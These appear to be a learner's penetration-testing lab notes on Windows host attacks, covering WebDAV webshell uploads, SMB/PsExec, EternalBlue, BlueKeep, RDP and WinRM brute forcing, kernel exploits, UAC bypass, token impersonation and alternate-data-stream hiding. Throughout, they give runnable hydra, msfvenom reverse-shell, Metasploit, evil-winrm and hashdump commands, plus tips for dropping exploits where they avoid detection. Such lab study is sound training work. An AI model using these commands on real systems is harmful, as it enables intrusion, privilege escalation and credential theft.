
# System/Host-based attacks
#Systemattacks #hostbasedattacks

- Looking at exploiting the system itself (Windows/Linux)
- Usually done after a network exploit (after gaining access to the network)
- Attacks are focused on exploiting inherent vulns in misconfigured OS 
- Useful when attacking a host (eg some random employee latop connected to the server which you prev accessed using a network attack)
- The host might not be running anyt except SMB (or other stuff natively built into windows ) to file share with the server, so understanding of windows is necessary
- impt for exploits where hosts do not have typical public-facing services running (HTTP/HTTPS etc)

Outline:
- Windows/Linux
	- Overview of vulns
	- Exploit these vulns
	- Priveledge escalation 
		- kernal exploitation/impersonation
	- File system vulns
	- Credential dumping
	- Lateral movement 
		- Use of credentials found to move between targets

# Windows
### Overview:
Common vulns
MS08-067(Conflicker) to MS17-010 (Eternal Blue)

Lots of legacy versions exist, fragmented nature of companies with diff unpatched vers leaves vuln

Built on C so vulnerable to common exploits:
- buffer overflow
- arbitrary code exec etc
Default install is not built to be secure (even in windows 10 etc)
Endpt protection has to be handled by the company (antivirus/firewall settings etc)

Common exploited services native to windows:
| Protocol/Service                                  | Default Ports        | Purpose                                                                         |
| ------------------------------------------------- | ------------ | ------------------------------------------------------------------------------- |
| Microsoft IIS (internet Information system)       | TCP 80/443   | Proprietary server software that runs on windows                                |
| WebDAV (web distributed authoring and versioning) | TCP 80/443   | HTTP extenstion allows web server to act as a file server                       |
| SMB/CIFS                                          | TCP 445      | Network file sharing and peripherals between computers on a LAN (eg Printers)                 |
| RDP                                               | TCP 3389     | Proprietary GUI used to remotely authenticate and interact with windows systems |
| WinRM (Remote management)                         | TCP 5986/443 | Remote management protocol for remote access to windows systems                 |
|                                                   |              |                                                                                 |


### Exploit WevDAV running on Microsoft IIS
#webdav
- IIS is a windows webserver. Functions like any web server (eg Apache or Nginx)
- Can be used for static/dynamis webpages
- developed in asp.net and PHP (can be set up to host asp or php web applicaiton)

- WebDav allows web server to function as a file server (like FTP) to allow collaborative editing etc
- Without SSL cert it runs on port 80 else with SSL it runs on 443 (ie http vs https)
- After bruteforcing auth, malicious ASP payload can be uploaded and executed  to create a reverse shell
Tools:
davtest - USed to scan auth and expl webDAV erver
cadaver - file upload/dl on-screen disp etc etc

Lab:
nmap script http-enum to scan the server
hydra to brute force auth in the /webdav/ directory found
```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
```
Davtest to see wat types of files can be uploaded
```bash
davtest -auth bob:password_123321 -url http://10.2.17.124/webdav
```
From the test prev, Txt,Asp and http files can be executed
So
Cadaver used to upload Rev shell
```bash
cadaver http://10.2.123.123/webdav
#enter username and password
#enumerate like a normal ftp server
```
Kali comes with some webshells found at:
ls -al /usr/share/webshells/

- Upload the asp shell found into the webdav server using cadaver
```cadaver
put /usr/share/webshells/asp/webshell.asp
```
Viewing the directory on the browser the webshell should be there for u to open.
Can run code in the box to execute commands on the target system
type c:\\flag.txt

#### Exploit using msf instead
1.msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2
LPORT=1234
-f asp > shell.asp
```
Note: 32 bit is usally used as it works for both 32 and 64 bit if u dont know the target servers specification

2.Cadaver to upload shell.asp (seen above)
Clicking the shell.asp in /webdav/ executes the payload, b4 that set up listener in msfconsole

```bash
#starts metasploit and metasploit framework database (Pretty sure it starts itself but idk?? yea...dont need the front part)
service postgresql start && msfconsole
```

```bash
#set options to match the msfvenom payload
use multi/handler
set payload windows/meterpreter/reverse_tcp
set port 1234
```

2b. Or use windows/iis/iis_webdav_uplaod_asp in msfconsole to upload (everything done on its own, even deletes the payload after)

```msf
#slightly tricky
set PATH webdav/matasploit%RAND%.asp
```

### Exploit SMB running on Microsoft IIS with PsExec
#smb
SMB intro
- 2 level authentication
	1. User authentication (pword+user)
	2. Share authentication (pword to access share)
- Utilise a challenge response auth system (encrypted string is sent back to match the servers) (ie the pword used)

PsExec intro
- Microsofts lightweight replacement for telnet to execute processes remotely
- auth is performed via SMB
- similar to RDP but without GUI (ie only tru CMD)
- It is a windows util so doesnt work in linux (unless u use wine), SO 
- psexec.py is used instead --> python tool same as psexec
- ^ its a Impacket tool wow
```bash
#authenticate user
psexec.py Administrator@10.2.24.221 cmd.exe
#you will be prompted for password
```
- Very clean as its a legit login (no malicious files etc)

To get auth
- SMB brute force
	- can narrow down users to administrator (every server has this acct)
	- smb_login on msf with 
	- /usr/share/metasploit-framework/data/wordlists/common_users.txt
	- pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
If want meterpreter
- exploit/windows/smb/psexec
- Enter creds found
-  run

### SMB exploit for EternalBlue
- a group of vulnerabilities that exists in SMBv1 giving a reverse shell and elevated privs
- Used by WannaCry to attack on June 2017
- Many windows versions affected

Check if can exploit:
nmap --script=smb-vuln-ms17-010 10.10.10.12 -sV -p445

Exploit manually:
AutoBlue-MS17-010
Set it up and run
--> code can be read on github to unnderstand how it works

Metasploit exploit:
exploit/windows/smb/ms17_010_eternalblue


## RDP service
- Gui remote access protocol dev by Ms to connect/interact w remote systems
- -p 3389 or any other port (lots of admins change it from default)
- Standard windows interface provided after connecting to the system
- Can always connect but need creds to gain access

Lab:
- RDP service is not actly on the default port
- NMap cant tell wat service is running
- Only way is to connect to it using RDP or using msf RDP scanner and set port to the one needed (ie 3333 here)

- Use hydra to bf pw
```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.24.142 -s 3333

#specifying the port is needed ifnot hydra assume the default port 3389
#also in actual work might limit bf speed (number if task) using -t 2 or 3 instead of default 16 so DOS doesnt happen
```
- hydra used freerdp to connect but the lab doesnt support it only xfreerdp
```bash
xfreerdp /u:administrator /p:qwertyuiop /v:10.0.24.142:3333
```
- A window pops up allowing u to connect to the target system

- Looks frking cool may i add

### RDP vuln CVE-2019-0708 (BlueKeep) 
- potentially allow attackers to RCE and access system/network
- exploit takes avantage of the vuln in RDP to gain access to a chunk of kernal memory allowing RCE at sytem level without auth
- Lots of illegitimate PoC's exists as Microsoft would not release PoC for a vuln they found
- MSF has a module for it to check and exploit
Note: targeting Kernal space memory and application gives elevated priv but can cause system crashes

MSF:
search bluekeep for aux and exploit
set target of windows u r targeting
```msfconsole
show tagrets
use <id>
```
Note that if the memory allocation size is too large, the xploit would crash the system (default is 250MB)

### WinRM exploit
- window remote managment over http and https
- not implemented on default
- Ease for admins to access all the nodes on a network
- usually -p5985 or 5986 if SSL is configured (ie HTTP vs HTTPS) --> Normal nmap scan wont reveal it as its not the top 1000 most common ports
- Nmap service scan also cant tell wat is the actual service running, must confirm using crackmapexec
- 2 ways to auth:
	1. Username + password
	2. Username + password hash
Exploit with crackmapexec (useful for many other windows services --> MSsql, SSH, smb, winrm )
Using a ruby script "evil-winrm" to get command shell access

```bash
#bf the password
crackmapexec winrm 10.10.11.198 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

#execute the command
crackmapexec winrm 10.10.11.198 -u administrator -p tinkerbell -x "whoami"


#to get a cmd
evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.2.18.19
```

Meterpreter session with available credentials
```msfconsole
search winrm_script_exec

#force the module to use a visual basic command stager needs this to work (yes)
#sends the payload in VBS format rather than default powershell. Useful if powershell is restricted or disabled but VBS is allowed to run

set FORCE_VBS true
```

# Windows Kernal exploits

### Priv exploit
- exploit misconfigs to gain access
- pivot around network to get access

Kernel:
Is the core of the OS and has complete control over resources and hardware of a system --> translation layer between hardware and software...Like the popcorn kernel (connected to the centre by a shell)
- Windows NT is the kernal pre-packaged with all vers of windows
- Its consists of 2 modes of operation:
	1. User mode - programs and services running in user mode have limited access to system resources and functionality
	2. Kernel mode - has unrestricted access to sys resources and functions with added function of managing devices and system memory
		- Kernel is targeted mainly as it provides highest priv
		- Goal is to execute arbi code to run prived system commands or obtain sys shell

- Based on windows version and kernal exploit being used
- Dont try on enterprise networks unless the exploits have been tested (could crash everyt unstable)
- usually follow the methodology
	1. Identify kernel vuln
	2. Download/compile and transfer kernel exploits
	(Eg version of windows 10 ---> check whoami /priv --> found that SeImpersonatePrivilege is enabled --> JuicyPotatoNG.exe --> wget/curl the exploit in --> execute )

Some tools:
Windows-Exploit-Suggester --> Tools to compare target to known vulns in microsoft database to detect missing patches etc. Also checks for msf modules to exploit

Windows-kernel-exploits --> Collection of kernel exploits sorted by CVE

Demo:
Try on metasploit
```msfconsole
#tries a bunch of known techniques
#while in the meterpreter session:
getsystem

#else try 
search /local_exploit_suggester

#choose the session to run on
#exploit suggester wll give some things to try, run those and see which works

```

#### Windows-exploit-suggester
Clone from github the .py script
--> Follow the readme from the Github or follow below
	1. Update the microsoft database
	2. Enter the stuff
```
#on the sessions
shell

#on the shell created 
systeminfo

#copy and paste the info into a text file like win7.txt or smt on your attacking pc

```
In the folder for WES
```
./windows-exploit-suggester.py --update

./windows-exploit-suggester.py --database 2021-12-26-mssb.xls --systeminfo ~/Desktop/win7.txt

```
The exploits listed at the top of the lists is most likely to work
[E] means theres a PoC for the exploit
[M] means theres a metasploit module for it

--> Sometimes theres c code to use. Compile it and run on the system
--> or download the executable if it alrdy exists.

Note: Download exploits into Temp dir or rarely used dirs to avoid detection
```msfconsole
#onthe target session
cd Temp\\
upload ~/Downloads/41015.exe
dir
.\41015.exe 

#to use example
.\4105.exe 7

#after sometime a new shell with elevated priv is given
whoami
```


## Bypassing UAC

- User account control
- ie prompt appears to ask to continue installing etc (Do you want to allow this app to make changes)
- For windows vista onwards (7,8,10,11)

- Must have auth acct with priveledges available
- different levels of intergrity exist, low to high

Tools:
UACMe
--> a comprehensive list of methods for var windows vers
--> an exe that allows execution of payload with elevated priv (in this case Akagi)

Demo:
Service is running compromised version of Rejetto
```msfconsole
use exploit/windows/http/rejetto_hfs_exec
getuid
sysinfo
getprivs

#check available processes to migrate shell to
ps -S explorer.exe

migrate 2444

#try known methods but no permission to elevate
getsystem

#check local groups on system, priv not high enuf
shell
net localgroup administrators
```

What UACMe akigai64 does:
-bypass UAC and get administrator privs (not to be confused with admin)

```bash
#generate the backdoor
msfvenom -p windows/meterpreter/revers_tcp LHOST=<myip> LPORT=<rndnum> -f exe > backdoor.exe
```

On the compromised system
```msfconsole
mkdir Temp
cd Temp
upload /root/Desktop/UACME/Akagi64.exe
upload /root/backdoor.exe


#on another msfconsole
use multi/handler
set ...... <match with the msfvenom payload>


#back on target machine using method 23 (33 is also cool)
shell
.\Akagi64.exe 23 backdoor.exe


#on the 2nd msfconsole terminal should pop out
ps 
migrate <some ps with NT authority/system>
hashdump
```
Note:
NTLM hashdump
Admin:502:aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3:::

Admin --> user
502 --> relative identifier (type of acct eg 500 is administrator 502 kerberos)
aad3c435b514a4eeaad3b935b51304fe --> LM hash, old version (for backword compatibility)
c46b9e588fa0d112de6f59fd6d58eae3 --> NTLM hash, more secure new version


## Access Token impersonation

--> created and managed by Local Security Authority Subsystem Servise (LSASS.exe)
--> Temporary key to provide access to a sys/resource (Like a webcookie)
--> created by winlogon.exe when someone logs on 
--> Token created is attached to userinit.exe process
--> all process created by said user will access this token for privs

--> two security levels of tokens
 - Impersonate-level --> created from non-interactive login (tru some service/domain logons)
	 - Can be used to impersonate token on the local system only (cant use externally)
 - Delegate-level --> created tru interactive login or remote access protocols like RDP (standard login methods)
	 - Largest threat as can be used to impersonate on any system

Windows Priviledges
(whoami /privs)
Following are required ( just 1 but mainly SeImpersonatePriv) for impersonation attack :
- SeAssignPrimaryToken: Allows user to impersonate tokens
- SeCreateToken: Allows user to create arbitrary token with admin privs
- SeImpersonatePriviledge: This allows user to create a process under security context of another user typically with admin privs

Tools:
Incognito module in MSF
--> dispalys lists of tokens available for impersonation

Demo:
- Same rejetto file sytem vuln as before

```msfconsole
search rejetto
.......

#on the compromised session
load incognito

#list all available tokens (If none then must use a potato attack, JuicypotatoNG etc)
list_tokens -u

#choose the highest privs token
impersonate_token "ATTACKDEFENCE\Administrator"

```
Note:
tokens might not be listed if user is not logged in etc. Then need use JuicyPotato watever (see HTB Flight Hard)


## Alternate Datastreams vulnerability 
--> for windows priv escalation
--> it is a NTFS (New Tech File System) file attribute designed to be compatible with MacOS HFS(Hierachical File System)

- NTFS drives have 2 fork/streams:
	- Data stream
	- Resource stream (metadata stored here)

--> ADS can be used to hide malicious code in the resource stream (simple evasion technique)
Examples:
```powershell
#create a file.txt with the hidden secret.txt and edit secret, use this to access the Resource stream also
notepad afile.txt:secret.txt

#SECRET.txt cannot be seen anywhere in the dir 
notepad afile.txt
#^^^^ only shows the afile.txt and not the secret.txt


#writes the payload as winpeas.txt into the windowslog.txt file
type payload.exe > windowslog.txt:winpeas.txt

#using the start command probly wont work
start windowslog.txt:winpeas.txt


#create a symbolic link to execute the resource stream in system32 using admin (??)
mklink windowsupdate.exe C:\Temp\Windowslog.txt:winpeas.exe

#now when u type windowsupdate it run the winpeas.exe script (via the symlink)
windowsupdate
```
